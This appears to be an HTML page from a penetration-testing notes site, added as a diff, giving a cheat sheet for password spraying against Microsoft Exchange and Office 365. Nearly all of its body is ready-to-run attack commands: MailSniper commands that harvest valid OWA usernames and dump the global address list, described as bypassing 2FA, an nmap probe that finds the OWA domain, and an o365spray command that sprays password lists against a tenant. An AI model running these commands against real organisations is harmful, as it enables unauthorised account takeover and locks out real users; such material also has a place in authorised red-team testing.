@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Different Password Spraying tools and methods - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Different Password Spraying tools and methods", url: "#_top", children: [
+              {title: "MailSniper[^1]", url: "#mailsniper1" },
+              {title: "Find OWA Domain", url: "#find-owa-domain" },
+              {title: "o365spray[^2]", url: "#o365spray2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="different-password-spraying-tools-and-methods">Different Password Spraying tools and methods</h1>
+<h2 id="mailsniper1">MailSniper[^1]</h2>
+<ul>
+<li>Advantages<ul>
+<li><code>Invoke-UsernameHarvestOWA</code> is very useful</li>
+<li><code>Get-GlobalAddressList</code> is awesome<ul>
+<li>bypasses 2FA in Office 365</li>
+<li>Easily dump list from OWA &amp; Office 365</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName user2@domain.com -Password &quot;P@ssw0rd&quot; -OutFile global-address-list.txt
+</span></code></pre></div>
+<h2 id="find-owa-domain">Find OWA Domain</h2>
+<h3 id="nmap">NMAP</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap -p 443 -Pn -v mail.domain.com --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
+</span></code></pre></div>
+<h2 id="o365spray2">o365spray[^2]</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>python3 o365spray.py --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
+</span></code></pre></div>
+<p>[^1]: <a href="https://github.com/dafthack/MailSniper">Github - Dafthack - MailSniper</a>
+[^2]: <a href="https://github.com/0xZDH/o365spray">Github - o365spray</a></p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/attack/password_spraying.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
